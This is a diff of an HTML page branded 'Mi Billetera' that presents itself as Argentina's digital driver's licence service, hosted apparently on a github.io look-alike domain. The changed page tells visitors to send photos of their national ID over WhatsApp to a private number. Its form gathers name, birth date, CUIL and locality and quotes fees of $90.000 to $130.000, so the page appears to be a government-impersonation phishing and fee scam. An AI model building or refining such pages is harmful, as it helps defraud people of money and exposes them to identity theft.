@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulario de Trámite | Mi Billetera</title>
+  <title>Licencia de conducir digital | Mi Billetera</title>
 
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">
 
@@ -11,7 +11,6 @@
     body {
       font-family: 'Encode Sans', sans-serif;
       margin: 0;
-      background-color: #fff;
     }
 
     .navbar {
@@ -36,79 +35,25 @@
       padding: 20px;
     }
 
-    /* Estilos del Formulario */
-    .form-group {
-      margin-bottom: 20px;
-    }
-
-    label {
-      display: block;
-      font-weight: 600;
-      margin-bottom: 8px;
-      color: #333;
-    }
-
-    input[type="text"],
-    input[type="tel"],
-    select {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-family: 'Encode Sans', sans-serif;
-      box-sizing: border-box;
-    }
-
-    .radio-group {
-      background: #f9f9f9;
-      padding: 15px;
-      border-radius: 8px;
-      border: 1px solid #eee;
-    }
-
-    .radio-option {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 10px;
-      padding: 5px 0;
-      border-bottom: 1px solid #eee;
-    }
-
-    .radio-option:last-child {
-      border-bottom: none;
-    }
-
-    .price-tag {
-      font-weight: 700;
-      color: #0072bb;
-    }
-
-    .btn-enviar {
-      background-color: #25d366;
+    .btn-licencia {
+      background-color: #0072bb;
       color: white;
       border-radius: 25px;
-      padding: 15px 40px;
-      font-weight: 700;
+      padding: 12px 30px;
+      font-weight: 600;
       text-transform: uppercase;
       text-decoration: none;
-      display: block;
-      width: 100%;
-      border: none;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 30px;
-      transition: background 0.3s;
+      display: inline-block;
+      margin-top: 20px;
     }
 
-    .btn-enviar:hover {
-      background-color: #128c7e;
-    }
-
-    footer {
-      background: #f5f5f5;
-      padding: 30px;
-      margin-top: 40px;
+    .btn-whatsapp-inline {
+      background-color: #25d366;
+      color: white;
+      padding: 2px 10px;
+      border-radius: 4px;
+      text-decoration: none;
+      font-weight: bold;
     }
   </style>
 </head>
@@ -120,55 +65,94 @@
   </div>
 
   <div class="header">
-    <h1>Solicitud de Trámite</h1>
-    <p>Completá tus datos para iniciar la gestión de tu licencia.</p>
+    <h1>Licencia de conducir digital</h1>
+    <p>La versión digital de tu licencia disponible en Mi Billetera.</p>
   </div>
 
   <div class="container">
-    <form id="tramiteForm">
-      
-      <div class="form-group">
-        <label for="nombre">Nombre y Apellido Completo</label>
-        <input type="text" id="nombre" placeholder="Ej: Juan Pérez" required>
+    <h2>Nueva licencia nacional de conducir digital</h2>
+    <p>
+      A partir del Decreto 196/2025 la licencia nacional de conducir será otorgada en formato digital y podrá ser replicada en formato físico.
+    </p>
+
+    <img src="https://i.postimg.cc/rpffzc7v/carnet-(2).jpg" width="100%">
+
+    <div style="text-align:center;">
+      <a href="https://miargentina-servicios.github.io/licencia/ConsultaLNC.html" class="btn-licencia">
+        Ver Licencia Digital
+      </a>
+    </div>
+
+    <h2>¿Cómo hago para tenerla?</h2>
+
+    <p><strong>1.</strong> Iniciá el trámite escribiéndonos por 
+      <a href="https://wa.me/5491131602393" class="btn-whatsapp-inline">WhatsApp</a>
+    </p>
+
+    <p><strong>2.</strong> Enviá foto de tu DNI (frente y dorso) para validar tus datos.</p>
+
+    <p><strong>3.</strong> Procesamos tu solicitud y generamos tu licencia digital.</p>
+
+    <p><strong>4.</strong> Recibís el acceso para visualizarla desde tu dispositivo.</p>
+
+    <div style="text-align:center;">
+      <a href="https://wa.me/5491131602393" class="btn-licencia">
+        Iniciar trámite ahora
+      </a>
+    </div>
+
+    <h2>Iniciar trámite</h2>
+
+    <label><strong>Tipo de trámite:</strong></label><br>
+    <select id="tipoTramite" onchange="mostrarFormulario()">
+      <option value="">Seleccionar</option>
+      <option value="primera">Mi primera licencia</option>
+      <option value="extravio">Renovación por extravío/robo</option>
+      <option value="vencimiento">Renovación por vencimiento</option>
+      <option value="recategoria">Recategorización</option>
+    </select>
+
+    <form id="formulario" onsubmit="enviarWhatsApp(event)" style="margin-top:20px; display:none;">
+
+      <input type="text" id="nombre" placeholder="Nombre" required><br><br>
+      <input type="text" id="apellido" placeholder="Apellido" required><br><br>
+      <input type="text" id="fecha" placeholder="Fecha de nacimiento (Ej: 15/03/1990)" required><br><br>
+
+      <input type="text" id="cuil" placeholder="CUIL (Ej: 20-12345678-3)" 
+        pattern="^\d{2}-\d{8}-\d{1}$" required><br><br>
+
+      <input type="text" id="localidad" placeholder="Localidad" required><br><br>
+
+      <div id="categorias" style="display:none;">
+        <label><strong>Categoría:</strong></label><br>
+        <select id="categoria">
+          <option>A1 - Motocicletas hasta 50cc</option>
+          <option>A2 - Motocicletas hasta 150cc</option>
+          <option>A3 - Motocicletas +150cc</option>
+          <option>B1 - Automóviles particulares</option>
+          <option>B2 - Automóviles con acoplado</option>
+          <option>C - Camiones</option>
+          <option>D - Transporte de pasajeros</option>
+          <option>E - Vehículos con remolque</option>
+          <option>F - Personas con discapacidad</option>
+          <option>G - Maquinaria especial</option>
+        </select><br><br>
       </div>
 
-      <div class="form-group">
-        <label for="dni">Número de DNI</label>
-        <input type="text" id="dni" placeholder="Sin puntos" required>
+      <div id="vencimientoOpciones" style="display:none;">
+        <label><strong>Duración:</strong></label><br>
+        <select id="duracion">
+          <option value="3">Renovación por 3 años</option>
+          <option value="5">Renovación por 5 años</option>
+        </select><br><br>
       </div>
 
-      <div class="form-group">
-        <label for="telefono">Teléfono de Contacto</label>
-        <input type="tel" id="telefono" placeholder="Ej: 1122334455" required>
-      </div>
-
-      <div class="form-group">
-        <label>Tipo de Trámite</label>
-        <div class="radio-group">
-          <div class="radio-option">
-            <label><input type="radio" name="tipo_tramite" value="Mi primer licencia" checked> Mi primer licencia</label>
-            <span class="price-tag">$15.000</span>
-          </div>
-          <div class="radio-option">
-            <label><input type="radio" name="tipo_tramite" value="Renovación (por vencimiento)"> Renovación (Vencimiento)</label>
-            <span class="price-tag">$12.000</span>
-          </div>
-          <div class="radio-option">
-            <label><input type="radio" name="tipo_tramite" value="Renovación por extravío/robo"> Renovación (Extravío/Robo)</label>
-            <span class="price-tag">$13.500</span>
-          </div>
-          <div class="radio-option">
-            <label><input type="radio" name="tipo_tramite" value="Recategorización"> Recategorización</label>
-            <span class="price-tag">$10.000</span>
-          </div>
-        </div>
-      </div>
-
-      <button type="button" class="btn-enviar" onclick="enviarWhatsApp()">ENVIAR A WHATSAPP</button>
+      <button type="submit" class="btn-licencia">Enviar solicitud</button>
     </form>
+
   </div>
 
-  <footer>
+  <footer style="background:#f5f5f5; padding:30px; margin-top:40px;">
     <div class="container" style="text-align:center;">
       <p><strong>Mi Billetera | Documentación Digital</strong></p>
       <p>Gestión y visualización de documentación digital de forma rápida y segura.</p>
@@ -178,32 +162,63 @@
     </div>
   </footer>
 
-  <script>
-    function enviarWhatsApp() {
-      const nombre = document.getElementById('nombre').value;
-      const dni = document.getElementById('dni').value;
-      const telefono = document.getElementById('telefono').value;
-      const tramite = document.querySelector('input[name="tipo_tramite"]:checked').value;
-      
-      // Número de teléfono de destino (el mismo del código original)
-      const numeroVentas = "5491131602393";
+<script>
+function mostrarFormulario() {
+  let tipo = document.getElementById("tipoTramite").value;
+  let form = document.getElementById("formulario");
 
-      if(!nombre || !dni || !telefono) {
-        alert("Por favor, completá todos los campos.");
-        return;
-      }
+  let categorias = document.getElementById("categorias");
+  let vencimiento = document.getElementById("vencimientoOpciones");
 
-      const mensaje = `Hola! Quiero iniciar un trámite:%0A%0A` +
-                      `*Nombre:* ${nombre}%0A` +
-                      `*DNI:* ${dni}%0A` +
-                      `*Teléfono:* ${telefono}%0A` +
-                      `*Trámite:* ${tramite}`;
+  form.style.display = "block";
 
-      const url = `https://wa.me/${numeroVentas}?text=${mensaje}`;
-      
-      window.open(url, '_blank');
-    }
-  </script>
+  categorias.style.display = "none";
+  vencimiento.style.display = "none";
+
+  if (tipo === "primera" || tipo === "extravio" || tipo === "recategoria") {
+    categorias.style.display = "block";
+  }
+
+  if (tipo === "vencimiento") {
+    vencimiento.style.display = "block";
+  }
+}
+
+function enviarWhatsApp(e) {
+  e.preventDefault();
+
+  let tipo = document.getElementById("tipoTramite").value;
+  let nombre = document.getElementById("nombre").value;
+  let apellido = document.getElementById("apellido").value;
+  let fecha = document.getElementById("fecha").value;
+  let cuil = document.getElementById("cuil").value;
+  let localidad = document.getElementById("localidad").value;
+  let categoria = document.getElementById("categoria")?.value || "";
+  let duracion = document.getElementById("duracion")?.value || "";
+
+  let precio = "";
+
+  if (tipo === "primera") precio = "$120.000";
+  if (tipo === "extravio") precio = "$100.000";
+  if (tipo === "vencimiento") precio = duracion == "5" ? "$110.000" : "$90.000";
+  if (tipo === "recategoria") precio = "$130.000";
+
+  let mensaje = `*SOLICITUD DE LICENCIA*\n\n` +
+    `Tipo de trámite: ${tipo}\n` +
+    `Nombre: ${nombre}\n` +
+    `Apellido: ${apellido}\n` +
+    `Fecha de nacimiento: ${fecha}\n` +
+    `CUIL: ${cuil}\n` +
+    `Localidad: ${localidad}\n` +
+    (categoria ? `Categoría: ${categoria}\n` : "") +
+    (duracion ? `Duración: ${duracion} años\n` : "") +
+    `\n💰 Precio: ${precio}`;
+
+  let url = "https://wa.me/5491131602393?text=" + encodeURIComponent(mensaje);
+
+  window.open(url, "_blank");
+}
+</script>
 
 </body>
-</html>
+      </html>
